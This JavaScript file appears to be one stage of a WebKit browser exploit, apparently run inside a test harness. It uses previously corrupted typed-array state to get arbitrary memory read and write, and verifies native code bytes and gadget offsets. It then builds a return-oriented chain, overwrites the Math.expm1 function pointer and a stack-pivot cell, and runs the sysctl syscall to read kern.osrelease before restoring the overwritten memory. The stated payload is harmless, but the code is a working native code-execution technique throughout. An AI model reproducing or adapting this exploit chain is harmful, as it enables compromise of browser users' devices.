// Read the known kern.osrelease setting as a six-argument sysctl control.
// One read-only native call writes only into guarded owned buffers.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
var slotArmed = false;
var pivotArmed = false;
var slotOriginal = [];
var pivotOriginal = [];
var restoreErrors = [];
var chainArmed = false;
var frameArmed = false;
var chainOriginal = [];
var frameOriginal = [];
var pivotStackOriginal = [];
var pivotStackArmed = false;
var scratchOffset = 0x2f80;
var dirOriginal = [];
var dirArmed = false;
var baseOriginal = [];
var baseArmed = false;
try {
  if (window.__fw14OwnedFd !== undefined)
    throw new Error("prior_descriptor_not_closed");
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.calibratedViewBase ||
      !state.ownedTypedView ||
      !state.otherTypedView || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_plan_preflight_failed");
  var forged = state.view;
  var a = state.ownedTypedView;
  var b = state.otherTypedView;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 || b[0] !== 0x42)
    throw new Error("owned_canaries_changed");
  function bytesAt(at) {
    var out = [];
    for (var n = 0; n < 8; n++) out.push(forged[at + n]);
    return out;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    var out;
    try {
      state.array[0] = value;
      out = bytesAt(state.index);
    } finally {
      state.array[0] = state.a;
    }
    return Number(hexLE(out));
  }
  var base = state.calibratedViewBase;
  var anchorIndex = wordOf(state.addressAnchor) + 8 - base;
  if (!Number.isSafeInteger(base) || base % 4096 !== 0 ||
      !Number.isSafeInteger(anchorIndex) || anchorIndex < 0 ||
      anchorIndex + 3 >= 2097152 ||
      forged[anchorIndex] !== 0x44 ||
      forged[anchorIndex + 1] !== 0x33 ||
      forged[anchorIndex + 2] !== 0x22 ||
      forged[anchorIndex + 3] !== 0x11)
    throw new Error("cached_anchor_gate_failed");
  var live = false;
  try {
    state.addressAnchor.marker = 0x55667788;
    live = forged[anchorIndex] === 0x88 &&
      forged[anchorIndex + 1] === 0x77 &&
      forged[anchorIndex + 2] === 0x66 &&
      forged[anchorIndex + 3] === 0x55;
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (!live) throw new Error("cached_anchor_not_live");
  var aIndex = wordOf(a) - base;
  var expWord = wordOf(Math.expm1);
  if (aIndex < 0 || aIndex + 15 >= 16777216 ||
      !Number.isSafeInteger(expWord) || expWord < 0x200000000)
    throw new Error("live_cells_outside_window");
  slot = aIndex + 8;
  original = bytesAt(slot);
  function pointerBytes(address) {
    if (!Number.isSafeInteger(address) || address <= 0)
      throw new Error("pointer_address_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function atAddress(address, bytes) {
    var next = pointerBytes(address);
    viewChanged = true;
    try {
      for (var n = 0; n < 8; n++) forged[slot + n] = next[n];
      if (typeof bytes === "number") {
        if (bytes < 1 || bytes > 192) throw new Error("read_size_invalid");
        var out = [];
        for (var r = 0; r < bytes; r++) out.push(a[r]);
        return out;
      }
      if (!bytes || bytes.length !== 8)
        throw new Error("write_size_invalid");
      for (var w = 0; w < 8; w++) a[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
      viewChanged = false;
    }
  }
  function same(actual, expected) {
    if (actual.length !== expected.length) return false;
    for (var n = 0; n < actual.length; n++)
      if (actual[n] !== expected[n]) return false;
    return true;
  }
  var metadata16 = Number(hexLE(atAddress(expWord + 16, 8)));
  var metadata24 = Number(hexLE(atAddress(expWord + 24, 8)));
  if (Number(metadata16 + 40 === plan.functionSlot) +
      Number(metadata24 + 40 === plan.functionSlot) !== 1)
    throw new Error("function_slot_identity_changed");
  slotOriginal = atAddress(plan.functionSlot, 8);
  pivotOriginal = atAddress(plan.pivotCell, 8);
  if (!same(slotOriginal, plan.originalFunctionSlot) ||
      !same(pivotOriginal.slice(0, 7), plan.pivotHeader.slice(0, 7)) ||
      pivotOriginal[7] > 2 ||
      wordOf(plan.pivotObject) !== plan.pivotCell)
    throw new Error("native_pointer_preflight_changed");
  if (hexForward(atAddress(plan.webkitBase + 0x295f948, 9)) !==
      "488b7e30488b07ff10" ||
      hexForward(atAddress(plan.target, 16)) !==
      "48c7c0140000004989ca0f057201c348")
    throw new Error("native_code_bytes_changed");
  var sysctlTarget = plan.target - 0xc20;
  var sysctlWrapper = hexForward(atAddress(sysctlTarget, 16));
  if (sysctlWrapper !== "48c7c0ca0000004989ca0f057201c348" ||
      hexForward(atAddress(sysctlTarget, 16)) !== sysctlWrapper)
    throw new Error("sysctl_wrapper_bytes_mismatch");
  if (hexForward(atAddress(plan.webkitBase + 0x6e45e, 2)) !== "5ec3" ||
      hexForward(atAddress(plan.webkitBase + 0x12c5ba, 2)) !== "5ac3" ||
      hexForward(atAddress(plan.webkitBase + 0x1bade, 2)) !== "59c3" ||
      hexForward(atAddress(plan.webkitBase + 0x9b311, 3)) !== "4758c3" ||
      hexForward(atAddress(plan.webkitBase + 0x1dcfb1, 3)) !== "4759c3")
    throw new Error("argument_gadgets_changed");
  var planViews = [plan.store, plan.pivot, plan.stack, plan.frame];
  var planKeys = ["store", "pivot", "stack", "frame"];
  for (var j = 0; j < planKeys.length; j++) {
    var view = planViews[j];
    var idx = wordOf(view) - base;
    if (idx < 0 || idx + 15 >= 16777216 ||
        Number(hexLE(bytesAt(idx + 8))) !== plan.addresses[planKeys[j]])
      throw new Error("owned_buffer_pointer_changed_" + planKeys[j]);
  }
  if (!same(atAddress(plan.addresses.store, 32),
      plan.store.subarray(0, 32)) ||
      !same(atAddress(plan.addresses.pivot, 64),
      plan.pivot.subarray(0, 64)) ||
      !same(atAddress(plan.addresses.stack + plan.stackOffset, 56),
      plan.stack.subarray(plan.stackOffset, plan.stackOffset + 56)))
    throw new Error("owned_chain_bytes_changed");
  if (!same(Array.from(plan.stack.subarray(plan.stackOffset,
      plan.stackOffset + 8)), pointerBytes(plan.target)))
    throw new Error("original_chain_target_changed");
  var errnoHelper = plan.target - 0x6cf0;
  if (hexForward(atAddress(errnoHelper, 16)) !==
      "554889e5488b05052503004885c07405")
    throw new Error("errno_helper_bytes_mismatch");
  if (scratchOffset + 184 >= plan.stack.length ||
      scratchOffset < plan.stackOffset + 64)
    throw new Error("scratch_chain_region_invalid");
  chainOriginal = Array.from(plan.stack.subarray(scratchOffset,
    scratchOffset + 184));
  pivotStackOriginal = atAddress(plan.addresses.pivot + 0x38, 8);
  if (!same(pivotStackOriginal,
      pointerBytes(plan.addresses.stack + plan.stackOffset)))
    throw new Error("pivot_stack_pointer_changed");
  var frameView = new DataView(plan.frame.buffer);
  if (frameView.getUint32(0, true) !== 0 ||
      frameView.getUint32(4, true) !== 0 ||
      frameView.getUint32(8, true) !== 0 ||
      frameView.getUint32(12, true) !== 0 ||
      Math.abs(Math.expm1(1) - 1.718281828459045) > 1e-12)
    throw new Error("baseline_or_frame_changed");
  if (api && typeof api.markSync === "function")
    api.markSync("sysctl_control_preflight");
  var latestSlot = atAddress(plan.functionSlot, 8);
  var latestPivot = atAddress(plan.pivotCell, 8);
  if (!same(latestSlot, slotOriginal) ||
      !same(latestPivot.slice(0, 7), pivotOriginal.slice(0, 7)) ||
      latestPivot[7] > 2)
    throw new Error("native_pointers_changed_after_marker");
  pivotOriginal = latestPivot;
  phase = "sysctl_osrelease_control_call";
  var callReturned = false;
  var callError = null;
  var callReturn = null;
  var oldlenAfter = null;
  var mibHex = "";
  var errnoValue = null;
  var inputIntact = false;
  var guardIntact = false;
  try {
    frameOriginal = Array.from(plan.frame.subarray(0, 16));
    frameArmed = true;
    plan.frame.fill(0xa5, 0, 16);
    baseOriginal = Array.from(plan.frame.subarray(0x200, 0x208));
    baseArmed = true;
    frameView.setUint32(0x200, 64, true);
    frameView.setUint32(0x204, 0, true);
    dirOriginal = Array.from(plan.frame.subarray(0x400, 0x1410));
    dirArmed = true;
    plan.frame.fill(0xa5, 0x400, 0x1410);
    frameView.setUint32(0x400, 1, true);
    frameView.setUint32(0x404, 2, true);
    var mibBytes = [1, 0, 0, 0, 2, 0, 0, 0];
    if (!same(atAddress(plan.addresses.frame + 0x400, 8),
        mibBytes) ||
        !same(atAddress(plan.addresses.frame + 0x600, 64),
        Array(64).fill(0xa5)))
      throw new Error("sysctl_owned_input_mismatch");
    chainArmed = true;
    var chainWords = [plan.webkitBase + 0x5c480,
      plan.addresses.frame + 0x400,
      plan.webkitBase + 0x6e45e, 2,
      plan.webkitBase + 0x12c5ba, plan.addresses.frame + 0x600,
      plan.webkitBase + 0x1bade, plan.addresses.frame + 0x200,
      plan.webkitBase + 0x9b311, 0,
      plan.webkitBase + 0x1dcfb1, 0,
      sysctlTarget, plan.webkitBase + 0x5c480,
      plan.addresses.frame, plan.webkitBase + 0x548b,
      errnoHelper, plan.webkitBase + 0x5c480,
      plan.addresses.frame + 8, plan.webkitBase + 0x548b,
      plan.webkitBase + 0x10504, null, plan.webkitBase + 0x182f7];
    var chainSize = chainWords.length * 8;
    if (chainSize !== 184 || scratchOffset + chainSize >= plan.stack.length)
      throw new Error("sysctl_chain_size_invalid");
    // Expand the saved scratch region before touching it.
    chainOriginal = Array.from(plan.stack.subarray(scratchOffset,
      scratchOffset + chainSize));
    var stackView = new DataView(plan.stack.buffer);
    for (var c = 0; c < chainWords.length; c++) {
      if (c === 21) {
        stackView.setUint32(scratchOffset + c * 8, 0x0a, true);
        stackView.setUint32(scratchOffset + c * 8 + 4, 0xfffffff7, true);
      } else {
        stackView.setUint32(scratchOffset + c * 8,
          chainWords[c] >>> 0, true);
        stackView.setUint32(scratchOffset + c * 8 + 4,
          Math.floor(chainWords[c] / 4294967296) >>> 0, true);
      }
    }
    pivotStackArmed = true;
    var nextStack = pointerBytes(plan.addresses.stack + scratchOffset);
    for (var p = 0; p < 8; p++) plan.pivot[0x38 + p] = nextStack[p];
    if (!same(atAddress(plan.addresses.stack + scratchOffset, chainSize),
        plan.stack.subarray(scratchOffset, scratchOffset + chainSize)) ||
        !same(atAddress(plan.addresses.pivot + 0x38, 8), nextStack))
      throw new Error("sysctl_owned_chain_mismatch");
    slotArmed = true;
    atAddress(plan.functionSlot, pointerBytes(plan.webkitBase + 0x295f948));
    pivotArmed = true;
    atAddress(plan.pivotCell, pointerBytes(plan.addresses.store));
    Math.expm1(plan.pivotObject);
    callReturned = true;
    callReturn = frameView.getInt32(0, true);
    oldlenAfter = frameView.getUint32(0x200, true);
    mibHex = hexForward(plan.frame.subarray(0x600, 0x640));
    inputIntact = same(plan.frame.subarray(0x400, 0x408),
      mibBytes);
    guardIntact = same(plan.frame.subarray(0x640, 0x650),
      Array(16).fill(0xa5));
  } catch (error) {
    callError = String(error).slice(0, 120);
  } finally {
    if (slotArmed) {
      try { atAddress(plan.functionSlot, slotOriginal); }
      catch (error) { restoreErrors.push("slot:" + String(error).slice(0, 70)); }
    }
    if (pivotArmed) {
      try { atAddress(plan.pivotCell, pivotOriginal); }
      catch (error) { restoreErrors.push("pivot:" + String(error).slice(0, 70)); }
    }
    if (chainArmed) {
      try {
        for (var q = 0; q < chainOriginal.length; q++)
          plan.stack[scratchOffset + q] = chainOriginal[q];
      } catch (error) {
        restoreErrors.push("chain:" + String(error).slice(0, 70));
      }
    }
    if (pivotStackArmed) {
      try {
        for (var z = 0; z < 8; z++)
          plan.pivot[0x38 + z] = pivotStackOriginal[z];
      } catch (error) {
        restoreErrors.push("pivot_stack:" + String(error).slice(0, 70));
      }
    }
    if (dirArmed) {
      try {
        for (var d = 0; d < dirOriginal.length; d++)
          plan.frame[0x400 + d] = dirOriginal[d];
      } catch (error) {
        restoreErrors.push("data:" + String(error).slice(0, 70));
      }
    }
    if (baseArmed) {
      try {
        for (var e = 0; e < 8; e++)
          plan.frame[0x200 + e] = baseOriginal[e];
      } catch (error) {
        restoreErrors.push("len:" + String(error).slice(0, 70));
      }
    }
  }
  phase = "verify_restore";
  var slotRestored = same(atAddress(plan.functionSlot, 8), slotOriginal);
  var pivotRestored = same(atAddress(plan.pivotCell, 8), pivotOriginal);
  var chainRestored = same(atAddress(plan.addresses.stack + scratchOffset,
    chainOriginal.length), chainOriginal);
  var dataRestored = same(plan.frame.subarray(0x400, 0x1410),
    dirOriginal);
  var lenRestored = same(plan.frame.subarray(0x200, 0x208),
    baseOriginal);
  var pivotStackRestored = same(atAddress(plan.addresses.pivot + 0x38, 8),
    pivotStackOriginal);
  var viewRestored = hexLE(bytesAt(slot)) === hexLE(original) &&
    a[0] === 0x31 && a[7] === 0xa8 && b[0] === 0x42 &&
    state.array[0] === state.a;
  var high = frameView.getUint32(4, true);
  var errnoPointer = Number(hexLE(Array.from(plan.frame.subarray(8, 16))));
  if (callReturned && callReturn === -1 &&
      Number.isSafeInteger(errnoPointer) &&
      errnoPointer >= 0x200000000 && errnoPointer < 0x900000000) {
    var errBytes = atAddress(errnoPointer, 4);
    errnoValue = errBytes[0] + errBytes[1] * 256 +
      errBytes[2] * 65536 + errBytes[3] * 16777216;
  }
  var expm1Restored = slotRestored && pivotRestored &&
    Math.abs(Math.expm1(1) - 1.718281828459045) <= 1e-12;
  if (frameArmed)
    for (var f = 0; f < 16; f++) plan.frame[f] = frameOriginal[f];
  var frameRestored = same(atAddress(plan.addresses.frame, 16),
    frameOriginal);
  frameArmed = false;
  if (api && typeof api.markSync === "function")
    api.markSync("sysctl_control_restored");
  var fullyRestored = slotRestored && pivotRestored && chainRestored &&
    pivotStackRestored && dataRestored && lenRestored &&
    frameRestored && viewRestored && expm1Restored &&
    restoreErrors.length === 0;
  result = { id: "sandbox_sysctl_osrelease_control_v1",
    status: callReturned && inputIntact && guardIntact &&
      ((callReturn === 0 && high === 0 && oldlenAfter > 0 && oldlenAfter <= 64 &&
        mibHex.slice(0, 2) !== "a5") ||
       (callReturn === -1 && high === 0xffffffff && errnoValue > 0)) &&
      fullyRestored ? "pass" : "fail",
    details: { call_return: callReturn, reported_length: oldlenAfter,
      value_hex: mibHex.slice(0, 128), errno: errnoValue,
      input_intact: inputIntact, guard_intact: guardIntact,
      data_restored: dataRestored, len_restored: lenRestored,
      browser_restored: fullyRestored,
      error: callError || (restoreErrors.length ?
        restoreErrors.join(";") : null) } };
} catch (error) {
  if (chainArmed && plan && plan.stack && chainOriginal.length)
    for (var k = 0; k < chainOriginal.length; k++)
      plan.stack[scratchOffset + k] = chainOriginal[k];
  if (pivotStackArmed && plan && plan.pivot &&
      pivotStackOriginal.length === 8)
    for (var m = 0; m < 8; m++)
      plan.pivot[0x38 + m] = pivotStackOriginal[m];
  if (frameArmed && plan && plan.frame && frameOriginal.length === 16)
    for (var h = 0; h < 16; h++) plan.frame[h] = frameOriginal[h];
  if (dirArmed && plan && plan.frame && dirOriginal.length === 0x1010)
    for (var d = 0; d < dirOriginal.length; d++)
      plan.frame[0x400 + d] = dirOriginal[d];
  if (baseArmed && plan && plan.frame && baseOriginal.length === 8)
    for (var e = 0; e < 8; e++) plan.frame[0x200 + e] = baseOriginal[e];
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "sandbox_sysctl_osrelease_control_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 200) } };
}
return [result];
